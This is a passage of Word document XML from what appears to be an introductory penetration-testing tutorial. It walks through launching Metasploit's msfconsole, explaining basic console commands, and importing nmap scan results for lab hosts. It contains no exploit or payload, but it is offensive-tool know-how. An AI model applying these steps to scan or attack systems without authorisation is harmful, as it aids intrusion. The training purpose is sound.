        <w:t xml:space="preserve"> Main PID: 779 (code=exited, status=0/SUCCESS)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2790E224" w14:textId="4830F11A" w:rsidR="008245A4" w:rsidRPr="00FB4F2F" w:rsidRDefault="008245A4" w:rsidP="00526315">
      <w:pPr>
        <w:pStyle w:val="TableGraphsource"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">   </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>CGroup</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>: /</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>system.slice</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>postgresql.service</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="09AB84A2" w14:textId="695968C0" w:rsidR="007456B1" w:rsidRDefault="007456B1" w:rsidP="007456B1">
      <w:pPr>
        <w:pStyle w:val="Bodycopy"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Run </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>msfconsole</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="140BF7D9" w14:textId="77777777" w:rsidR="007456B1" w:rsidRDefault="007456B1" w:rsidP="007456B1">
      <w:pPr>
        <w:pStyle w:val="Bodycopy"/>
      </w:pPr>
      <w:r>
        <w:t>-</w:t>
      </w:r>
      <w:r>
        <w:tab/>
        <w:t>#</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>msfconsole</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="2A2FEDC4" w14:textId="77777777" w:rsidR="007456B1" w:rsidRDefault="007456B1" w:rsidP="007456B1">
      <w:pPr>
        <w:pStyle w:val="Bodycopy"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The first time you run </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>msfconsole</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> there can be a slight delay as indices are updated.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0BC138F2" w14:textId="77777777" w:rsidR="007456B1" w:rsidRDefault="007456B1" w:rsidP="007456B1">
      <w:pPr>
        <w:pStyle w:val="Bodycopy"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Your output will vary on each run – since this is the free version – but the final lines should look </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>similar to</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> the following:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="69408523" w14:textId="77777777" w:rsidR="007456B1" w:rsidRDefault="007456B1" w:rsidP="00526315">
      <w:pPr>
        <w:pStyle w:val="TableGraphsource"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">       </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>=[</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>metasploit</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> v4.14.5-dev                          ]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B4079E3" w14:textId="77777777" w:rsidR="007456B1" w:rsidRDefault="007456B1" w:rsidP="00526315">
      <w:pPr>
        <w:pStyle w:val="TableGraphsource"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t>+ -- --</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>=[</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> 1639 exploits - 945 auxiliary - 286 post        ]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2390E211" w14:textId="77777777" w:rsidR="007456B1" w:rsidRDefault="007456B1" w:rsidP="00526315">
      <w:pPr>
        <w:pStyle w:val="TableGraphsource"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t>+ -- --</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>=[</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> 473 payloads - 40 encoders - 9 </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>nops</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve">             ]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="083D6F89" w14:textId="77777777" w:rsidR="007456B1" w:rsidRDefault="007456B1" w:rsidP="00526315">
      <w:pPr>
        <w:pStyle w:val="TableGraphsource"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t>+ -- --</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>=[</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> Free Metasploit Pro trial: http://r-7.co/trymsp ]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="081A0413" w14:textId="77777777" w:rsidR="007456B1" w:rsidRDefault="007456B1" w:rsidP="007456B1">
      <w:pPr>
        <w:pStyle w:val="Bodycopy"/>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>msf</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> &gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="691AEF11" w14:textId="77777777" w:rsidR="007456B1" w:rsidRDefault="007456B1" w:rsidP="007456B1">
      <w:pPr>
        <w:pStyle w:val="Bodycopy"/>
      </w:pPr>
      <w:r>
        <w:t>You’re now in MSFconsole and you can investigate some of the commands available to you.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="495258C9" w14:textId="77777777" w:rsidR="007456B1" w:rsidRDefault="007456B1" w:rsidP="007456B1">
      <w:pPr>
        <w:pStyle w:val="Bodycopy"/>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>msf</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> &gt; help &lt;command&gt; </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7724E94A" w14:textId="77777777" w:rsidR="007456B1" w:rsidRDefault="007456B1" w:rsidP="007456B1">
      <w:pPr>
        <w:pStyle w:val="Bodycopy"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">For </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>example</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> you can see the possible switches for the connect command:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E16A6A7" w14:textId="77777777" w:rsidR="007456B1" w:rsidRDefault="007456B1" w:rsidP="007456B1">
      <w:pPr>
        <w:pStyle w:val="Bodycopy"/>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>msf</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> &gt; help connect</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5973EDA5" w14:textId="77777777" w:rsidR="007615F3" w:rsidRDefault="007615F3" w:rsidP="00526315">
      <w:pPr>
        <w:pStyle w:val="TableGraphsource"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t>Usage: connect [options] &lt;host&gt; &lt;port&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="34363D13" w14:textId="77777777" w:rsidR="007615F3" w:rsidRDefault="007615F3" w:rsidP="00526315">
      <w:pPr>
        <w:pStyle w:val="TableGraphsource"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Communicate with a host, </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>similar to</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> interacting via </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>netcat</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>, taking advantage of</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1FD1D107" w14:textId="77777777" w:rsidR="007615F3" w:rsidRDefault="007615F3" w:rsidP="00526315">
      <w:pPr>
        <w:pStyle w:val="TableGraphsource"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t>any configured session pivoting.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="504234B0" w14:textId="77777777" w:rsidR="007615F3" w:rsidRDefault="007615F3" w:rsidP="00526315">
      <w:pPr>
        <w:pStyle w:val="TableGraphsource"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t>OPTIONS:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7CF9D90C" w14:textId="77777777" w:rsidR="007615F3" w:rsidRDefault="007615F3" w:rsidP="00526315">
      <w:pPr>
        <w:pStyle w:val="TableGraphsource"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">    -C        Try to use CRLF for EOL sequence.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="18088C49" w14:textId="77777777" w:rsidR="007615F3" w:rsidRDefault="007615F3" w:rsidP="00526315">
      <w:pPr>
        <w:pStyle w:val="TableGraphsource"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">    -P &lt;opt</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>&gt;  Specify</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> source port.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1AFA87CA" w14:textId="77777777" w:rsidR="007615F3" w:rsidRDefault="007615F3" w:rsidP="00526315">
      <w:pPr>
        <w:pStyle w:val="TableGraphsource"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">    -S &lt;opt</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>&gt;  Specify</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> source address.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="18381DDD" w14:textId="77777777" w:rsidR="007615F3" w:rsidRDefault="007615F3" w:rsidP="00526315">
      <w:pPr>
        <w:pStyle w:val="TableGraphsource"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">    -c &lt;opt</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>&gt;  Specify</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> which Comm to use.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3BDE53B8" w14:textId="77777777" w:rsidR="007615F3" w:rsidRDefault="007615F3" w:rsidP="00526315">
      <w:pPr>
        <w:pStyle w:val="TableGraphsource"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">    -h        Help banner.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B3E88AB" w14:textId="77777777" w:rsidR="007615F3" w:rsidRDefault="007615F3" w:rsidP="00526315">
      <w:pPr>
        <w:pStyle w:val="TableGraphsource"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">    -</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>i</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> &lt;opt</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>&gt;  Send</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> the contents of a file.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="090DE543" w14:textId="77777777" w:rsidR="007615F3" w:rsidRDefault="007615F3" w:rsidP="00526315">
      <w:pPr>
        <w:pStyle w:val="TableGraphsource"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">    -p &lt;opt</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>&gt;  List</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> of proxies to use.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7520E659" w14:textId="77777777" w:rsidR="007615F3" w:rsidRDefault="007615F3" w:rsidP="00526315">
      <w:pPr>
        <w:pStyle w:val="TableGraphsource"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">    -s        Connect with SSL.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A31C837" w14:textId="77777777" w:rsidR="007615F3" w:rsidRDefault="007615F3" w:rsidP="00526315">
      <w:pPr>
        <w:pStyle w:val="TableGraphsource"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">    -u        Switch to a UDP socket.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="32DA9E67" w14:textId="77777777" w:rsidR="007615F3" w:rsidRDefault="007615F3" w:rsidP="00526315">
      <w:pPr>
        <w:pStyle w:val="TableGraphsource"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">    -w &lt;opt</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>&gt;  Specify</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> connect timeout.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="07FBA6A5" w14:textId="77777777" w:rsidR="007615F3" w:rsidRDefault="007615F3" w:rsidP="00526315">
      <w:pPr>
        <w:pStyle w:val="TableGraphsource"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">    -z        Just try to connect, then return.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26044EBA" w14:textId="5D8A3446" w:rsidR="003B20F4" w:rsidRDefault="007615F3" w:rsidP="00526315">
      <w:pPr>
        <w:pStyle w:val="TableGraphsource"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>msf</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> &gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0238E8E9" w14:textId="701FEB3F" w:rsidR="008245A4" w:rsidRDefault="008245A4">
      <w:pPr>
        <w:pStyle w:val="Bodycopy"/>
      </w:pPr>
      <w:r>
        <w:t>We will spend time in Metasploit investigating some of the commands later but for now, here are s</w:t>
      </w:r>
      <w:r w:rsidR="00AE7F73">
        <w:t>ome of the interesting commands.  You can type ‘help &lt;command&gt;’ for some information on each of these.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40D9A360" w14:textId="6CCE9F41" w:rsidR="00AE7F73" w:rsidRDefault="00AE7F73" w:rsidP="00AE7F73">
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>options</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="10DD7156" w14:textId="11E3BB74" w:rsidR="00CA11EB" w:rsidRDefault="00AE7F73" w:rsidP="00AE7F73">
      <w:pPr>
        <w:pStyle w:val="Bodycopy"/>
      </w:pPr>
      <w:r>
        <w:t>Options are like command line flags for your exploits and modules.  You’ll use this all the time.  Use ‘show options’ to see what has been set for your current exploit/module.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="49D91676" w14:textId="77777777" w:rsidR="00AE7F73" w:rsidRDefault="00AE7F73" w:rsidP="00526315">
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>advanced</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58483D81" w14:textId="630AA06C" w:rsidR="00AE7F73" w:rsidRDefault="00AE7F73">
      <w:pPr>
        <w:pStyle w:val="Bodycopy"/>
      </w:pPr>
      <w:r>
        <w:t>I know you’re reading this and saying, “I’m just starting!” but advanced gives you access to debugging and other helpful information while you’re testing vulnerabilities and you’ll use this command often.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="29B92F5E" w14:textId="4F20B8D5" w:rsidR="00CA11EB" w:rsidRDefault="00CA11EB">
      <w:pPr>
        <w:pStyle w:val="Bodycopy"/>
      </w:pPr>
      <w:r>
        <w:t>For items listed in ‘options’ and ‘advanced’ you can use:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="355F9FD7" w14:textId="6954B368" w:rsidR="00CA11EB" w:rsidRDefault="00CA11EB" w:rsidP="00526315">
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>set or unset</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71738CF2" w14:textId="03C7B940" w:rsidR="00CA11EB" w:rsidRPr="00CA11EB" w:rsidRDefault="00CA11EB">
      <w:pPr>
        <w:pStyle w:val="Bodycopy"/>
      </w:pPr>
      <w:r>
        <w:t>These commands operation on the flags shown in options and advanced.  You can set the flags or if you want to set it back to the default/blank value you can unset it.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26ABB1B0" w14:textId="77777777" w:rsidR="00AE7F73" w:rsidRDefault="00AE7F73" w:rsidP="00526315">
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>info</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D259CB5" w14:textId="77777777" w:rsidR="00AE7F73" w:rsidRDefault="00AE7F73">
      <w:pPr>
        <w:pStyle w:val="Bodycopy"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Like options and advanced, this displays </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>all of</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> your current settings.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2EF5BDC0" w14:textId="77777777" w:rsidR="00AE7F73" w:rsidRDefault="00AE7F73" w:rsidP="00AE7F73">
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>workspace</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="247D320A" w14:textId="77777777" w:rsidR="00AE7F73" w:rsidRDefault="00AE7F73" w:rsidP="00AE7F73">
      <w:pPr>
        <w:pStyle w:val="Bodycopy"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">You can create different areas to work in, each with their own settings and defaults.  These are known as workspaces.  When you’re testing different vulnerabilities setting each in their own workspace can be helpful and a real time saver. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A10E72D" w14:textId="77777777" w:rsidR="00AE7F73" w:rsidRDefault="00AE7F73" w:rsidP="00AE7F73">
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>reload_all</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="35817480" w14:textId="77777777" w:rsidR="00AE7F73" w:rsidRDefault="00AE7F73" w:rsidP="00AE7F73">
      <w:pPr>
        <w:pStyle w:val="Bodycopy"/>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>reload_all</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> is useful when you add new modules or exploits to Metasploit and want to import them into the database.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="425F3375" w14:textId="77777777" w:rsidR="00AE7F73" w:rsidRDefault="00AE7F73" w:rsidP="00AE7F73">
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>jobs</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5945EAFD" w14:textId="77777777" w:rsidR="00AE7F73" w:rsidRDefault="00AE7F73" w:rsidP="00AE7F73">
      <w:pPr>
        <w:pStyle w:val="Bodycopy"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">You can push jobs into the background within the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>msfconsole</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> environment and this will show you active running jobs and allow you to push or pull them to the foreground or background.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A04490F" w14:textId="57D5F645" w:rsidR="00C3001E" w:rsidRDefault="00AE7F73">
      <w:pPr>
        <w:pStyle w:val="Bodycopy"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00C3001E">
        <w:t>Exit out of Metasploit after you have spent some time looking around.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="39E53707" w14:textId="3B1FC4F9" w:rsidR="00C3001E" w:rsidRDefault="00C3001E" w:rsidP="00526315">
      <w:pPr>
        <w:pStyle w:val="TableGraphsource"/>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>msf</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> &gt; exit</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4CD46A82" w14:textId="382CC84D" w:rsidR="00C3001E" w:rsidRPr="00FB4F2F" w:rsidRDefault="00C3001E" w:rsidP="00526315">
      <w:pPr>
        <w:pStyle w:val="Call-outQuote"/>
      </w:pPr>
      <w:r w:rsidRPr="00FB4F2F">
        <w:rPr>
          <w:rStyle w:val="Emphasis"/>
          <w:i w:val="0"/>
          <w:iCs w:val="0"/>
        </w:rPr>
        <w:t>You’re now a Hacker!</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="764D651F" w14:textId="6C32A34C" w:rsidR="008245A4" w:rsidRDefault="008245A4" w:rsidP="00526315">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Importing </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>nmap</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> scan results</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6DAF9B69" w14:textId="58036F9D" w:rsidR="008245A4" w:rsidRPr="008245A4" w:rsidRDefault="008245A4">
      <w:pPr>
        <w:pStyle w:val="Bodycopy"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Once the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>nmap</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> process has completed in the first shell, you can return to Metasploit and import the data.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="079FAF72" w14:textId="2AAE27CA" w:rsidR="00C72990" w:rsidRDefault="00C72990">
      <w:pPr>
        <w:pStyle w:val="Bodycopy"/>
      </w:pPr>
      <w:r>
        <w:t>Return to Metasploit</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="763929B3" w14:textId="6AB3A492" w:rsidR="00C72990" w:rsidRDefault="00C72990" w:rsidP="00526315">
      <w:pPr>
        <w:pStyle w:val="TableGraphsource"/>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>msfconsole</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="62E95C79" w14:textId="2D3A54DC" w:rsidR="00C72990" w:rsidRDefault="00C72990" w:rsidP="00526315">
      <w:pPr>
        <w:pStyle w:val="TableGraphsource"/>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>db_import</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> /</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>tmp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>/nmap.xml</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31D6450E" w14:textId="4C76B0B4" w:rsidR="002550AF" w:rsidRDefault="002550AF" w:rsidP="00526315">
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>db_import</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="0065D7FD" w14:textId="15C0E060" w:rsidR="002550AF" w:rsidRDefault="002550AF">
      <w:pPr>
        <w:pStyle w:val="Bodycopy"/>
      </w:pPr>
      <w:r>
        <w:t>This command takes an XML file of a scan and will bring it into the Metasploit database.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3EF8A085" w14:textId="77777777" w:rsidR="002550AF" w:rsidRDefault="002550AF" w:rsidP="00526315">
      <w:pPr>
        <w:pStyle w:val="TableGraphsource"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t>[*] Importing 'Nmap XML' data</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6332E981" w14:textId="77777777" w:rsidR="002550AF" w:rsidRDefault="002550AF" w:rsidP="00526315">
      <w:pPr>
        <w:pStyle w:val="TableGraphsource"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t>[*] Import: Parsing with '</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>Nokogiri</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> v1.7.2'</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3334D5E0" w14:textId="77777777" w:rsidR="002550AF" w:rsidRDefault="002550AF" w:rsidP="00526315">
      <w:pPr>
        <w:pStyle w:val="TableGraphsource"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t>[*] Importing host 10.1.10.14</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0CFDCE51" w14:textId="77777777" w:rsidR="002550AF" w:rsidRDefault="002550AF" w:rsidP="00526315">
      <w:pPr>
        <w:pStyle w:val="TableGraphsource"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t>[*] Importing host 10.1.10.35</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7FE0A807" w14:textId="77777777" w:rsidR="002550AF" w:rsidRDefault="002550AF" w:rsidP="00526315">
      <w:pPr>
        <w:pStyle w:val="TableGraphsource"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t>[*] Importing host 10.1.10.50</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="689B13FE" w14:textId="77777777" w:rsidR="002550AF" w:rsidRDefault="002550AF" w:rsidP="00526315">
      <w:pPr>
        <w:pStyle w:val="TableGraphsource"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
